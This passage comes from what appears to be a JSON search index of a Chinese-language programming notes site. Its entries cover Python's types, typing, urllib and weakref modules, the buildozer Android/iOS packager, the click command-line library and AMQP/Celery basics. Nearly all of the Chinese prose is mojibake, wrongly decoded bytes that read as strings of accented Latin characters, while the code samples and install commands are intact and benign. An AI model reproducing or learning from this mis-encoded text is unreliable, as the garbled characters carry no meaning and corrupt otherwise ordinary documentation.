åœ¨æ‰©å±•æ¨¡å—ä¸­å®šä¹‰çš„å¯¹è±¡çš„ç±»å‹ï¼Œä¾‹å¦‚ datetime.timedelta.daysã€‚ æ­¤ç±»å‹è¢«ç”¨ä½œä½¿ç”¨æ ‡å‡†è½¬æ¢å‡½æ•°çš„ç®€å• C æ•°æ®æˆå‘˜çš„æè¿°å™¨ï¼›å®ƒçš„ç›®çš„ä¸ property ç±»å‹ç›¸åŒï¼Œä½†ä¸“é—¨é’ˆå¯¹åœ¨æ‰©å±•æ¨¡å—ä¸­å®šä¹‰çš„ç±»ã€‚ CPython å®ç°ç»†èŠ‚ï¼š åœ¨ Python çš„å…¶å®ƒå®ç°ä¸­ï¼Œæ­¤ç±»å‹å¯èƒ½ä¸ GetSetDescriptorType å®Œå…¨ç›¸åŒã€‚ class types.MappingProxyType(mapping) ä¸€ä¸ªæ˜ å°„çš„åªè¯»ä»£ç†ã€‚ å®ƒæä¾›äº†å¯¹æ˜ å°„æ¡ç›®çš„åŠ¨æ€è§†å›¾ï¼Œè¿™æ„å‘³ç€å½“æ˜ å°„å‘ç”Ÿæ”¹å˜æ—¶ï¼Œè§†å›¾ä¼šåæ˜ è¿™äº›æ”¹å˜ã€‚ åœ¨ 3.9 ç‰ˆæ›´æ”¹: æ›´æ–°ä¸ºæ”¯æŒ PEP 584 æ‰€æ–°å¢çš„åˆå¹¶ (|) è¿ç®—ç¬¦ï¼Œå®ƒä¼šç®€å•åœ°å§”æ‰˜ç»™ä¸‹å±‚çš„æ˜ å°„ã€‚ proxy[key] è¿”å›ä¸‹å±‚çš„æ˜ å°„ä¸­ä»¥ key ä¸ºé”®çš„é¡¹ã€‚ å¦‚æœä¸‹å±‚çš„æ˜ å°„ä¸­ä¸å­˜åœ¨é”® key åˆ™å¼•å‘ KeyErrorã€‚ iter(proxy) è¿”å›ç”±ä¸‹å±‚æ˜ å°„çš„é”®ä¸ºå…ƒç´ çš„è¿­ä»£å™¨ã€‚ è¿™æ˜¯ iter(proxy.keys()) çš„å¿«æ·æ–¹å¼ã€‚ len(proxy) è¿”å›ä¸‹å±‚æ˜ å°„ä¸­çš„é¡¹æ•°ã€‚ copy() è¿”å›ä¸‹å±‚æ˜ å°„çš„æµ…æ‹·è´ã€‚ get(key[, default]) å¦‚æœ key å­˜åœ¨äºä¸‹å±‚æ˜ å°„ä¸­åˆ™è¿”å› key çš„å€¼ï¼Œå¦åˆ™è¿”å› defaultã€‚ å¦‚æœ default æœªç»™å‡ºåˆ™é»˜è®¤ä¸º Noneï¼Œå› è€Œæ­¤æ–¹æ³•ç»ä¸ä¼šå¼•å‘ KeyErrorã€‚ items() è¿”å›ç”±ä¸‹å±‚æ˜ å°„çš„é¡¹ ((é”®, å€¼) å¯¹) ç»„æˆçš„ä¸€ä¸ªæ–°è§†å›¾ã€‚ keys() è¿”å›ç”±ä¸‹å±‚æ˜ å°„çš„é”®ç»„æˆçš„ä¸€ä¸ªæ–°è§†å›¾ã€‚ values() è¿”å›ç”±ä¸‹å±‚æ˜ å°„çš„å€¼ç»„æˆçš„ä¸€ä¸ªæ–°è§†å›¾ã€‚ reversed(proxy) è¿”å›ä¸€ä¸ªåŒ…å«ä¸‹å±‚æ˜ å°„çš„é”®çš„åå‘è¿­ä»£å™¨ã€‚ é™„åŠ å·¥å…·ç±»/å‡½æ•° åç¨‹å·¥å…·å‡½æ•°","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-types.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-types.html"},{"title":"typing","text":"ç±»å‹æ³¨è§£æ¨¡å— Union Union æ˜¯å½“æœ‰å¤šç§å¯èƒ½çš„æ•°æ®ç±»å‹æ—¶ä½¿ç”¨ï¼Œæ¯”å¦‚å‡½æ•°æœ‰å¯èƒ½æ ¹æ®ä¸åŒæƒ…å†µæœ‰æ—¶è¿”å›stræˆ–è¿”å›listï¼Œé‚£ä¹ˆå°±å¯ä»¥å†™æˆ: Union[list, str] Optional Optional æ˜¯Unionçš„ä¸€ä¸ªç®€åŒ–ï¼Œ å½“ æ•°æ®ç±»å‹ä¸­æœ‰å¯èƒ½æ˜¯Noneæ—¶ï¼Œæ¯”å¦‚æœ‰å¯èƒ½æ˜¯strä¹Ÿæœ‰å¯èƒ½æ˜¯Noneï¼Œ åˆ™: Optional[str] ç›¸å½“äº: Union[str, None] æ³¨æ„ å’Œ å‡½æ•°æœ‰é»˜è®¤å‚æ•°Noneæœ‰åŒºåˆ«ï¼Œæœ‰åŒºåˆ«ï¼Œæœ‰åŒºåˆ«ï¼Œä¸å¯çœç•¥é»˜è®¤å‚æ•°ï¼Œå¦‚ä¸‹ç¤ºä¾‹: # åŸå§‹ def func(args = None): # é”™ def func(args:Optional[str]) -> None: # å¯¹ def func(args:Optional[str] = None) -> None: Type è¡¨ç¤ºå€¼ä¸ºæ‰€æŒ‡å®šç±»æˆ–å…¶å­ç±»: arg1: Type[ClassObj] Callable è¡¨ç¤ºå¯è°ƒç”¨å¯¹è±¡, æ”¯æŒæŒ‡å®šå‚æ•°ä¸è¿”å›å€¼. eg, å¼‚æ­¥å‡½æ•°çš„ç±»å‹æ³¨è§£: Callable[..., Awaitable] è¡¨ç¤ºæ˜¯asyncå‡½æ•°, ä¸”å‚æ•°ä»»æ„, ç›¸å½“äºæ­¤å‡½æ•°: async def fun(...) -> Awaitable: åˆ¤æ–­æ³¨è§£æ˜¯å¦å¼•å…¥äº†typing Python ä¸­æ²¡æœ‰å¼ºå®šä¹‰ç±»å‹, ä¸è¿‡å¯ä»¥ä½¿ç”¨ç±»å‹æ³¨è§£, å¦‚: @dataclass class Person(object): name: str pet: List[Cat] = field(default_factory=list) pet2: Cat = field(default_factory=Cat) ç±»å‹æ³¨è§£é™¤äº†ä½¿ç”¨åŸºç¡€çš„æ•°æ®ç±»å‹, è¿˜å¯ä»¥ä½¿ç”¨ typing æ¨¡å—ä¸‹çš„å®šä¹‰, åˆ¤æ–­æ˜¯å¦æ˜¯typingä¸‹çš„æ³¨è§£: from typing import _GenericAlias for f in fields(Person): print('type', f.type) if isinstance(f.type, _GenericAlias): print(f'{f.name} is isinstance of _GenericAlias') è·å–typingæ³¨è§£çš„è¯¦ç»†ä¿¡æ¯ è·å–æ³¨è§£å‚æ•°åˆ—è¡¨, ä½¿ç”¨: typing.get_args() è·å–æ³¨è§£çš„è¯¦ç»†ç±»å‹, å¦‚: In [31]: import typing In [32]: typing.get_args(typing.Dict[str, tuple]) Out[32]: (<class 'str'>, <class 'tuple'>) è¿”å›ç»“æœæ˜¯ä¸€ä¸ªå…ƒç»„ è·å–ç›¸å…³åŸºç¡€ç±»å‹ è·å–æ³¨è§£åŸå§‹ç±»å‹, ä½¿ç”¨ typing.get_origin In [33]: typing.get_origin(typing.Dict[str, tuple]) Out[33]: <class 'dict'>","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-typing.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-typing.html"},{"title":"unicodedata","text":"å®šä¹‰äº†ä»¥ä¸‹å‡½æ•° æ­¤å¤–ï¼Œè¯¥æ¨¡å—æš´éœ²äº†ä»¥ä¸‹å¸¸é‡ï¼š unicodedata.unidata_version æ­¤æ¨¡å—ä¸­ä½¿ç”¨çš„ Unicode æ•°æ®åº“çš„ç‰ˆæœ¬ã€‚ unicodedata.ucd_3_2_0 è¿™æ˜¯ä¸€ä¸ªä¸æ•´ä¸ªæ¨¡å—å…·æœ‰ç›¸åŒæ–¹æ³•çš„å¯¹è±¡ï¼Œ ä½†å¯¹äºéœ€è¦æ­¤ç‰¹å®šç‰ˆæœ¬çš„ Unicode æ•°æ®åº“ï¼ˆå¦‚ IDNA ï¼‰çš„åº”ç”¨ç¨‹åºï¼Œåˆ™ä½¿ç”¨ Unicode æ•°æ®åº“ç‰ˆæœ¬ 3.2 ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-unicodedata.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-unicodedata.html"},{"title":"urllib","text":"urlç¼–ç  parse.urlencode, å°†pythonå­—å…¸æ•°æ®è¿”å›urlæ ¼å¼çš„æ•°æ® parse.quote, å°†urlæ ¼å¼æ•°æ®ç¼–ç  parse.unquote, ä¸Šä¸€ä¸ªç»“æœçš„è§£ç , è¿”å›æ™®é€šurlæ ¼å¼æ•°æ® ä¾‹: data = {'a': 1, 'b': 2, } # å°†pythonå¯¹è±¡è½¬æ¢ä¸ºurlæ ¼å¼ r = parse.urlencode(data) _logger.info(r) # a=1&b=2 # url ç¼–ç ï¼Œ & = ç­‰å­—ç¬¦éƒ½ä¼šè¢«ç¼–ç  r = parse.quote(r) _logger.info(r) # a%3D1%26b%3D2 # url è§£ç ï¼Œ ä»…è½¬æ¢ä¸ºæ™®é€šå­—ç¬¦ä¼ æ‹¼æ¥çš„å½¢å¼ r = parse.unquote(r) _logger.info(r) # a=1&b=2","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-urllib.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-urllib.html"},{"title":"weakref","text":"å¼±å¼•ç”¨ å®˜ç½‘: https://docs.python.org/zh-cn/3/library/weakref.html weakref æ¨¡å—å…è®¸Pythonç¨‹åºå‘˜åˆ›å»ºå¯¹è±¡çš„ weak references ã€‚ åœ¨ä¸‹æ–‡ä¸­ï¼Œæœ¯è¯­ referent è¡¨ç¤ºç”±å¼±å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡ã€‚ å¯¹å¯¹è±¡çš„å¼±å¼•ç”¨ä¸èƒ½ä¿è¯å¯¹è±¡å­˜æ´»ï¼šå½“å¯¹åƒçš„å¼•ç”¨åªå‰©å¼±å¼•ç”¨æ—¶ï¼Œ garbage collection å¯ä»¥é”€æ¯å¼•ç”¨å¹¶å°†å…¶å†…å­˜é‡ç”¨äºå…¶ä»–å†…å®¹ã€‚ ä½†æ˜¯ï¼Œåœ¨å®é™…é”€æ¯å¯¹è±¡ä¹‹å‰ï¼Œå³ä½¿æ²¡æœ‰å¼ºå¼•ç”¨ï¼Œå¼±å¼•ç”¨ä¹Ÿä¸€ç›´èƒ½è¿”å›è¯¥å¯¹è±¡ã€‚ å¼±å¼•ç”¨çš„ä¸»è¦ç”¨é€”æ˜¯å®ç°ä¿å­˜å¤§å¯¹è±¡çš„é«˜é€Ÿç¼“å­˜æˆ–æ˜ å°„ï¼Œä½†åˆä¸å¸Œæœ›å¤§å¯¹è±¡ä»…ä»…å› ä¸ºå®ƒå‡ºç°åœ¨é«˜é€Ÿç¼“å­˜æˆ–æ˜ å°„ä¸­è€Œä¿æŒå­˜æ´»ã€‚ æœ€å¸¸ç”¨:","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-weakref.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-weakref.html"},{"title":"buildozer","text":"æš‚æ—¶æ‰¾åˆ°çš„å®˜ç½‘æ–‡æ¡£: https://buildozer.readthedocs.io/en/latest/installation.html ä¸€ä¸ªç”¨äºæ„å»ºPythonåº”ç”¨ç¨‹åºçš„å‘½ä»¤è¡Œå·¥å…·, å¯ä»¥å°†pythonä»£ç æ‰“åŒ…ä¸ºå®‰å“çš„APKæˆ–è€…IPhoneçš„IPA. æ³¨è§£ è¿™ç©æ„å„¿ä¸€å¼€å§‹åªæ˜¯ä¸ºäº†kivyè¿™ä¸ªå¼€æºè·¨å¹³å°GUIæ¡†æ¶å¼€å‘çš„, åé¢å‡çº§äº†æ”¯æŒåŸºæœ¬ä¸Šæ‰€æœ‰çš„Pythonäº†, å°±æ˜¯éœ€è¦æ‰‹åŠ¨é…ç½®. å®‰è£…: pip install buildozer ä¸»è¦ç‰¹ç‚¹ è·¨å¹³å°æ”¯æŒï¼š Buildozerå¯ä»¥åœ¨å¤šä¸ªæ“ä½œç³»ç»Ÿä¸Šä½¿ç”¨ï¼ŒåŒ…æ‹¬Windowsã€Linuxå’ŒmacOSç­‰ã€‚ ç®€å•æ˜“ç”¨ï¼š ç”¨æˆ·åªéœ€è¦ç¼–è¾‘buildozer.specæ–‡ä»¶ï¼Œå³å¯è½»æ¾é…ç½®åº”ç”¨ç¨‹åºçš„æ„å»ºé€‰é¡¹å’Œä¾èµ–é¡¹ã€‚ è‡ªåŠ¨åŒ–ä¾èµ–ç®¡ç†ï¼š Buildozerä¼šè‡ªåŠ¨ä¸‹è½½å’Œå®‰è£…æ‰€éœ€çš„ä¾èµ–é¡¹å’Œåº“ï¼Œè€Œæ— éœ€æ‰‹åŠ¨å¹²é¢„ã€‚ æ”¯æŒPython 2å’Œ3ï¼š Buildozerå¯ä»¥è¿›è¡ŒPythonç‰ˆæœ¬é€‰æ‹©ï¼Œå¹¶åœ¨æ„å»ºè¿‡ç¨‹ä¸­è‡ªåŠ¨å¤„ç†ä¸åŒç‰ˆæœ¬çš„å·®å¼‚ã€‚ å¤šç§æ„å»ºé€‰é¡¹ï¼š Buildozeræ”¯æŒå¤šç§æ„å»ºé€‰é¡¹ï¼Œä¾‹å¦‚debugå’Œreleaseç‰ˆæœ¬ã€ARMå’Œx86æ¶æ„ç­‰ã€‚ é«˜åº¦å¯å®šåˆ¶ï¼š Buildozeræä¾›äº†å¤§é‡çš„å‘½ä»¤è¡Œé€‰é¡¹å’Œé…ç½®é€‰é¡¹ï¼Œä»¥æ»¡è¶³ä¸åŒåœºæ™¯ä¸‹çš„å®šåˆ¶éœ€æ±‚ã€‚ ä½¿ç”¨æµç¨‹ é…ç½®æ–‡ä»¶è®¾ç½® buildozer.spec åˆ›å»ºä¸€ä¸ªæ–°çš„buildozer.specæ–‡ä»¶ã€‚ è¯¥æ–‡ä»¶åŒ…å«åº”ç”¨ç¨‹åºçš„é…ç½®å’Œç›¸å…³ä¿¡æ¯ï¼Œä¾‹å¦‚åº”ç”¨ç¨‹åºåç§°ã€ä½œè€…ã€ç‰ˆæœ¬å·å’Œä¾èµ–é¡¹ç­‰ã€‚ å¯ä»¥ä½¿ç”¨å‘½ä»¤: buildozer init æ¥åˆ›å»ºä¸€ä¸ªé»˜è®¤çš„buildozer.specæ–‡ä»¶. ç¼–è¾‘buildozer.specæ–‡ä»¶ä»¥åŒ…å«æ‰€éœ€çš„æ„å»ºé…ç½®ã€‚ å¯ä»¥åœ¨æ­¤æ–‡ä»¶ä¸­æŒ‡å®šéœ€è¦çš„æƒé™ã€å¯åŠ¨å±å¹•ã€åº”ç”¨ç¨‹åºå›¾æ ‡ç­‰ã€‚ åº”ç”¨çš„ç‰ˆæœ¬, å¯ä»¥è‡ªåŠ¨æ¢æµ‹, ç›´æ¥åœ¨æ–‡ä»¶å…¥å£çš„pyæ–‡ä»¶åŠ å…¥: __version__ = \"1.0.3\" å³å¯ é…ç½®é¡¹è¯´æ˜ titleï¼šåº”ç”¨ç¨‹åºçš„åç§°ã€‚ package.nameï¼šåº”ç”¨ç¨‹åºçš„åŒ…åã€‚ package.domainï¼šåº”ç”¨ç¨‹åºçš„åŸŸåã€‚ source.dirï¼šåº”ç”¨ç¨‹åºçš„æºä»£ç ç›®å½•ã€‚ requirementsï¼šåº”ç”¨ç¨‹åºæ‰€éœ€çš„Pythonåº“å’Œç¬¬ä¸‰æ–¹åº“ã€‚ android.permissionsï¼šåº”ç”¨ç¨‹åºéœ€è¦çš„Androidæƒé™ã€‚ android.apiï¼šåº”ç”¨ç¨‹åºéœ€è¦çš„Android APIçº§åˆ«ã€‚ android.sdkï¼šAndroid SDKçš„è·¯å¾„ã€‚ ios.codesign.identityï¼šiOSä»£ç ç­¾åçš„èº«ä»½ã€‚ APKæ„å»º(å®‰å“ä½¿ç”¨) å®‰å“ç¼–è¯‘éœ€è¦çš„å‰ç½®åŒ… debian/ubuntu20/22 sudo apt update sudo apt install -y git zip unzip openjdk-17-jdk python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev pip3 install --user --upgrade Cython==0.29.33 virtualenv # the --user should be removed if you do this in a venv # add the following line at the end of your ~/.bashrc file export PATH=$PATH:~/.local/bin/ windows10/11, éœ€è¦æ‰“å¼€ WSLçš„æ”¯æŒ, ç„¶ååŒæ ·æ‰§è¡Œä¸Šè¿°æŒ‡ä»¤. MacOs: python3 -m pip install --user --upgrade Cython==0.29.33 virtualenv # the --user should be removed if you do this in a venv brew install pkg-config sdl2 sdl2_image sdl2_ttf sdl2_mixer gstreamer autoconf automake é€šè¿‡ä½¿ç”¨: buildozer android debug å‘½ä»¤æ¥æ„å»ºdebugç‰ˆæœ¬çš„APKæ–‡ä»¶ï¼Œ æˆ–è€…ä½¿ç”¨: buildozer android release å‘½ä»¤æ¥æ„å»ºå‘å¸ƒç‰ˆæœ¬çš„APKæ–‡ä»¶ã€‚ è¿™å°†ä¼šè‡ªåŠ¨ä¸‹è½½å¹¶æ„å»ºæ‰€æœ‰å¿…è¦çš„ä¾èµ–é¡¹ï¼Œç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶å°†å…¶æ‰“åŒ…åˆ°ä¸€ä¸ªAPKæ–‡ä»¶ä¸­ã€‚ IPAæ„å»º(è‹¹æœä½¿ç”¨) æ„å»ºiOSåº”ç”¨ç¨‹åºï¼ˆå¯é€‰ï¼‰ã€‚ å¦‚æœéœ€è¦æ„å»ºiOSåº”ç”¨ç¨‹åºï¼Œåˆ™éœ€è¦åœ¨Mac OSç³»ç»Ÿä¸Šè¿›è¡Œï¼Œå¹¶è®¾ç½®Xcodeç¯å¢ƒå’Œç›¸å…³è¯ä¹¦ç­‰ã€‚ å¯ä»¥ä½¿ç”¨ buildozer ios debug æˆ– buildozer ios release å‘½ä»¤æ¥æ„å»ºiOSåº”ç”¨ç¨‹åºã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Buildozer.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Buildozer.html"},{"title":"click","text":"click æ˜¯å¯¹ Argparse è¿›è¡Œå°è£…åçš„ä¸€ä¸ª python å‘½ä»¤è¡Œå·¥å…· (ç±»ä¼¼ request å¯¹ urllib çš„å°è£…) å‘½ä»¤è¡Œå·¥å…·, ä½¿ç”¨è£…é¥°å™¨é…ç½®é€‰é¡¹å‚æ•°. æ™®é€šå½¢å¼ , ä¸€ä¸ªå‡½æ•°ä¸Šæ‰“ä¸Šæ‰€æœ‰é€‰é¡¹å‚æ•° ç»„ , ä»¥ç»„çš„å½¢å¼ä½¿ç”¨ æ™®é€šå½¢å¼ å¦‚: import sys import click @click.command() # è¡¨ç¤ºåŒ…è£…ä¸º click æŒ‡ä»¤ @click.option('-u', '--user', type=str, help='username') # æ·»åŠ é€‰é¡¹å‚æ•° @click.option('-p', '--password', type=str, help='password') # æ·»åŠ é€‰é¡¹å‚æ•° @click.option('-a', '--about', type=str, help='about message', default=None, show_default=True) # æ·»åŠ é€‰é¡¹å‚æ•° @click.option('--admin', type=bool, default=False) # æ·»åŠ é€‰é¡¹å‚æ•° def run(user: str, password: str, about: str='about message', admin: bool = False): if user == 'xxx': click.echo('login failed', err=True) return elif user and password: click.echo('login success') if admin: click.echo('you are a admin') click.echo(f'{about = }') if __name__ == '__main__': run(sys.argv[1:]) æ•ˆæœ: yanque@yanquedembp with_click % python click_one_f.py --help Usage: click_one_f.py [OPTIONS] Options: -u, --user TEXT username -p, --password TEXT password -a, --about TEXT about message --admin BOOLEAN --help Show this message and exit. yanque@yanquedembp with_click % python click_one_f.py about = None yanque@yanquedembp with_click % python click_one_f.py -u xxx -p xxx login failed yanque@yanquedembp with_click % python click_one_f.py -u xxxx -p xxx login success about = None ç»„ åˆ›å»ºç»„ï¼Œå°±æ˜¯é€šè¿‡ä¸€ä¸ªä¸»å…¥å£å‡½æ•°ï¼Œå»å…³è”å…¶ä»–çš„å‡½æ•°ï¼Œå…¶ä»–çš„å‡½æ•°åå¯ä»¥ä½œä¸ºå‘½ä»¤ç›´æ¥ä½¿ç”¨: import sys import click @click.group() def main(): ... @main.command() # è¡¨ç¤ºåŒ…è£…ä¸º click æŒ‡ä»¤ @click.option('-u', '--user', required=True, type=str, help='username') # æ·»åŠ é€‰é¡¹å‚æ•° def login_user(user: str): ... @main.command() @click.option('-p', '--password', required=True, type=str, help='password') # æ·»åŠ é€‰é¡¹å‚æ•° def login_password(password: str): ... if __name__ == '__main__': main(sys.argv[1:]) æ•ˆæœ: yanque@yanquedembp with_click % python click_group_f.py --help Usage: click_group_f.py [OPTIONS] COMMAND [ARGS]... Options: --help Show this message and exit. Commands: login-password login-user ä½¿ç”¨ æ”¯æŒå•å‡½æ•°ä½¿ç”¨ä¸groupåˆ†ç»„ä½¿ç”¨ @click.group() åˆ†ç»„ä½¿ç”¨ @click.command() ä½œä¸ºå‘½ä»¤è¡Œé€‰é¡¹ä½¿ç”¨ @click.argument() ä½ç½®å‚æ•° @click.option() å…³é”®å­—å‚æ•° - default - type - help - show_default import click @click . command () @click . option ( '-m' , '--msg' , help = 'this is use to echo a msg' ) def show_msg ( msg ): click . echo ( 'input ' + msg ) @click . command () @click . option ( '-i' , # çŸ­é€‰é¡¹ '--int_v' , # é•¿é€‰é¡¹ï¼Œ æ³¨æ„ä¸å‡½æ•°çš„å‚æ•°åä¸€è‡´ # type=int, default = 1 , # ç”¨é»˜è®¤å€¼å°±å¯ä»¥ä¸ç”¨ type=int help = 'echo a int value' , show_default = True ) def show_int ( int_v : int ): click . echo ( 'input ' + str ( int_v )) @click . command () @click . argument ( 'name' ) # ç›¸å½“äº python ä½ç½®å‚æ•° @click . option ( '-i' , # çŸ­é€‰é¡¹ï¼Œ ç›¸å½“äº python å…³é”®å­—å‚æ•° '--int_v' , # é•¿é€‰é¡¹ï¼Œ æ³¨æ„ä¸å‡½æ•°çš„å‚æ•°åä¸€è‡´ # type=int, default = 1 , # ç”¨é»˜è®¤å€¼å°±å¯ä»¥ä¸ç”¨ type=int help = 'echo a int value' , show_default = True ) def show_int2 ( name , int_v : int ): click . echo ( 'input ' + name + str ( int_v )) @click . group () def use_group (): pass @use_group . command ( help = 'show a msg' ) @click . option ( '-m' , '--msg' , help = 'this is use to echo a msg' ) def group_show_msg ( msg ): click . echo ( 'input ' + msg ) @use_group . command ( help = 'show a integer msg' ) @click . option ( '-i' , # çŸ­é€‰é¡¹ '--int_v' , # é•¿é€‰é¡¹ï¼Œ æ³¨æ„ä¸å‡½æ•°çš„å‚æ•°åä¸€è‡´ # type=int, default = 1 , # ç”¨é»˜è®¤å€¼å°±å¯ä»¥ä¸ç”¨ type=int required = True , help = 'echo a int value' , show_default = True ) def group_show_int ( int_v : int ): click . echo ( 'input ' + str ( int_v )) def main (): # # å•ä¸ªä½¿ç”¨æ–¹å¼ï¼Œ ç›´æ¥è°ƒç”¨å‡½æ•°, ä¸€æ¬¡åªèƒ½ç”¨ä¸€ä¸ª # # ä½¿ç”¨é»˜è®¤å€¼çš„è°ƒç”¨ python3 t_click.pyï¼Œ è¾“å‡º input 1 # # ä¸ä½¿ç”¨é»˜è®¤å€¼çš„è°ƒç”¨ python3 t_click.py -i 10ï¼Œ è¾“å‡º input 10 # show_int() # # show_msg() # group ç»„çš„å½¢å¼ï¼Œ ç»„ä¼šè‡ªåŠ¨å…³è”æ‰€æœ‰å¯è°ƒç”¨å‡½æ•°(å³command) # ä¸€æ¬¡åªèƒ½ä½¿ç”¨ä¸€ä¸ªé€‰é¡¹ # python3 t_click.py group-show-msg -m tt # è¾“å‡º input tt # python3 t_click.py group-show-int # è¾“å‡º input 1 use_group () if __name__ == '__main__' : main () éè£…é¥°å™¨è°ƒç”¨ click.echo(...) ç±»ä¼¼äº print click.ClickException(...) rasieä½¿ç”¨ click.get_current_context() è·å–å…¨å±€ä¸Šä¸‹é—®, å•çº¿ç¨‹å†…æœ‰æ•ˆ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-CLICK.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-CLICK.html"},{"title":"AMQP å…¥é—¨","text":"celery åŸºæœ¬ä¸Šå…¨éƒ¨å…¼å®¹äº† AMQP çš„å®ç°, æ‰€ä»¥æ­¤å¤„å¯¹æ­¤ä½œä¸€ä¸ªäº†è§£è¯´æ˜. æ¶ˆæ¯ ä¸€ä¸ªæ¶ˆæ¯ç”±æ¶ˆæ¯å¤´å’Œæ¶ˆæ¯ä½“ç»„æˆã€‚ Celery ä½¿ç”¨æ¶ˆæ¯å¤´æ¥å­˜å‚¨æ¶ˆæ¯çš„å†…å®¹ç±»å‹ä»¥åŠå†…å®¹çš„ç¼–ç ã€‚ å†…å®¹ç±»å‹é€šå¸¸æ˜¯ç”¨æ¥åºåˆ—åŒ–æ¶ˆæ¯çš„åºåˆ—åŒ–æ ¼å¼ï¼Œ æ¶ˆæ¯ä½“åŒ…å«è¦æ‰§è¡Œçš„ä»»åŠ¡çš„åç§°ï¼Œä»»åŠ¡ID(UUID)ï¼Œæ‰§è¡Œä»»åŠ¡çš„å‚æ•°ä»¥åŠä¸€äº›é¢å¤–çš„å…ƒæ•°æ®(æ¯”å¦‚é‡è¯•æ¬¡æ•°å’ŒETA(ä¸‹æ¬¡æ‰§è¡Œä»»åŠ¡çš„æ—¶é—´))ã€‚ è¿™æ˜¯é€šè¿‡ä¸€ä¸ª Python çš„å­—å…¸æ¥è¡¨ç¤ºçš„ç¤ºä¾‹ä»»åŠ¡æ¶ˆæ¯: {'task': 'myapp.tasks.add', 'id': '54086c5e-6193-4575-8308-dbab76798756', 'args': [4, 4], 'kwargs': {}} ç”Ÿäº§è€…ï¼Œæ¶ˆè´¹è€…å’Œä¸­é—´äºº å‘é€æ¶ˆæ¯çš„å®¢æˆ·ç«¯é€šå¸¸è¢«ç§°ä¸ºä¸€ä¸ªå‘å¸ƒè€…ï¼Œæˆ–ä¸€ä¸ªç”Ÿäº§è€…ï¼Œè€Œæ¥æ”¶æ¶ˆæ¯çš„å®ä½“è¢«ç§°ä¸ºæ¶ˆè´¹è€…ã€‚ ä¸­é—´äººæ˜¯å°†æ¶ˆæ¯ä»ç”Ÿäº§è€…è·¯ç”±åˆ°æ¶ˆè´¹è€…çš„æ¶ˆæ¯æœåŠ¡å™¨ã€‚ ä½ å¯èƒ½åœ¨ä¸AMQPç›¸å…³çš„ææ–™ä¸­çœ‹åˆ°è¿™äº›æœ¯è¯­è¢«å¤§é‡ä½¿ç”¨ã€‚ äº¤æ¢æœºï¼Œé˜Ÿåˆ—å’Œè·¯ç”±é”® æ¶ˆæ¯å°†è¢«å‘é€åˆ°äº¤æ¢æœº äº¤æ¢æœºå°†æ¶ˆæ¯è·¯ç”±åˆ°ä¸€ä¸ªæˆ–è€…å¤šä¸ªé˜Ÿåˆ—ã€‚å­˜åœ¨å¤šç§äº¤æ¢æœºç±»å‹æ¥æä¾›ä¸åŒçš„æ¶ˆæ¯è·¯ç”±æ–¹å¼ï¼Œæˆ–å®ç°ä¸åŒçš„æ¶ˆæ¯å‘é€æ–¹æ¡ˆã€‚ æ¶ˆæ¯å°†åœ¨é˜Ÿåˆ—ä¸­ç­‰å¾…ç›´åˆ°æœ‰äººæ¶ˆè´¹å®ƒã€‚ ä¸€æ—¦æ¶ˆæ¯è¢«ç¡®è®¤æ¶ˆè´¹ï¼Œå°†ä¼šä»é˜Ÿåˆ—ä¸­åˆ é™¤ã€‚ å‘é€å’Œæ¥æ”¶æ¶ˆæ¯æ‰€éœ€è¦çš„æ­¥éª¤å¦‚ä¸‹: åˆ›å»ºä¸€ä¸ªäº¤æ¢æœº åˆ›å»ºä¸€ä¸ªé˜Ÿåˆ— ç»‘å®šé˜Ÿåˆ—åˆ°äº¤æ¢æœºã€‚ ä¸ºäº†ä½¿ task_queues ä¸­çš„é˜Ÿåˆ—å·¥ä½œï¼Œ Celery å°†ä¼šè‡ªåŠ¨åˆ›å»ºæ‰€éœ€è¦çš„å®ä½“(é™¤éé˜Ÿåˆ—çš„ auto_declare é€‰é¡¹è¢«è®¾ç½®ä¸º False )ã€‚ ä¸‹æ–¹æ˜¯ä¸€ä¸ªåŒ…å«ä¸‰ä¸ªé˜Ÿåˆ—çš„ç¤ºä¾‹é˜Ÿåˆ—é…ç½®; ä¸€ä¸ªç”¨äºè§†é¢‘ï¼Œä¸€ä¸ªç”¨äºå›¾ç‰‡ï¼Œå¦ä¸€ä¸ªç”¨äºå…¶ä»–æ¶ˆæ¯çš„é»˜è®¤é˜Ÿåˆ—: from kombu import Exchange, Queue app.conf.task_queues = ( Queue('default', Exchange('default'), routing_key='default'), Queue('videos', Exchange('media'), routing_key='media.video'), Queue('images', Exchange('media'), routing_key='media.image'), ) app.conf.task_default_queue = 'default' app.conf.task_default_exchange_type = 'direct' app.conf.task_default_routing_key = 'default' äº¤æ¢æœºç±»å‹ ç›´è¿äº¤æ¢æœº ä¸»é¢˜äº¤æ¢æœº äº¤æ¢æœºçš„ç±»å‹å®šä¹‰äº†äº¤æ¢æœºå°†ä¼šå¦‚ä½•è·¯ç”±æ¶ˆæ¯ã€‚ åœ¨æ­£å¸¸æƒ…å†µä¸‹äº¤æ¢æœºè¢«å®šä¹‰ä¸º direct, topic, fanoutã€‚ æ­¤å¤–ä¹Ÿå¯ä»¥é€šè¿‡ RabbitMQ çš„æ’ä»¶æ¥ä½¿ç”¨éæ ‡å‡†çš„äº¤æ¢æœºç±»å‹ï¼Œ æ¯”å¦‚ç”± Michael Bridgen å®ç°çš„ last-value-cache plug-in ã€‚ ç›´è¿äº¤æ¢æœº 